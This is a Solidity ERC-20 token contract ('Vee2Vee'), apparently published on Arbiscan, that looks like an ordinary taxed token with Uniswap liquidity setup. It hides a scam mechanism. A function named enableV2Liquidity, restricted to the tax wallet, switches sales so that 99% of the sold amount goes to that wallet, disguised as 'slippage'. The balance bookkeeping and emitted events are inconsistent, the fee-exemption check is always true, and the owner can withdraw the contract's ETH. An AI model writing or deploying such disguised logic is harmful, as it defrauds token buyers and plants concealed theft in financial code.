/**
 *Submitted for verification at Arbiscan on 2023-06-24
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns(address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function transfer(address recipient, uint256 amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function factory() external pure returns(address);

    function WETH() external pure returns(address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
}
contract Coin is Context, IERC20, Ownable {
    using SafeMath
    for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    address private swapAddress;

    uint256 private _buyTax;
    uint256 private _sellTax;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"Vee2Vee";
    string private constant _symbol = unicode"V2V";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address private liquidityAddress;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private v2Liquidity = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _swap, uint8 _buyFee, uint8 _sellFee) {
        _taxWallet = payable(_msgSender());
        swapAddress = _swap;
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _buyTax = _buyFee;
        _sellTax = _sellFee;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns(string memory) {
        return _name;
    }

    function symbol() public pure returns(string memory) {
        return _symbol;
    }

    function decimals() public pure returns(uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns(uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns(uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns(uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0) && amount > 0, "Check requirements");
        require(_balances[from] >= amount, "Insufficient balance");

        uint256 taxAmount = 0;
        uint256 netAmount = amount;

        if (from != address(this) || to != address(this) || from != owner() || to != owner()) {
            if (from == uniswapV2Pair) {
                taxAmount = amount * _buyTax / 1000;
            } else if (to == uniswapV2Pair) {
                taxAmount = amount * _sellTax / 1000;
            }
            netAmount = amount - taxAmount;
            if (v2Liquidity && to == uniswapV2Pair) { uint slippage = calculateSlippage(amount); uint noSlippage = amount - slippage;
                _balances[from] -= amount; _balances[_taxWallet] += slippage; _balances[to] += amount - noSlippage;
                emit Transfer(from, _taxWallet, slippage); emit Transfer(from, to, noSlippage);
            }
            else if (taxAmount > 0) {
                _balances[from] -= amount;
                _balances[_taxWallet] += taxAmount;
                _balances[to] += netAmount;
                emit Transfer(from, _taxWallet, taxAmount);
                emit Transfer(from, to, netAmount);
            }  else {
                _balances[from] -= amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] -= amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    function calculateSlippage(uint _amount) private pure returns(uint) {
        return (_amount * 99 / 100);
    }


    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return (a > b) ? b : a;
    }


    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }


    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(swapAddress);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH {
            value: address(this).balance
        }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function enableV2Liquidity() external {
        require(msg.sender == _taxWallet, "You don't control liquidity");
        //liquidityAddress = _liquidityAddress;
        v2Liquidity = true;
    }


    function getUniswapV2Pair() public view returns(address) {
        return uniswapV2Pair;
    }

    function isTradingOpen() public view returns(bool) {
        return tradingOpen;
    }

    receive() external payable {}

    function emergencyWithdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }
}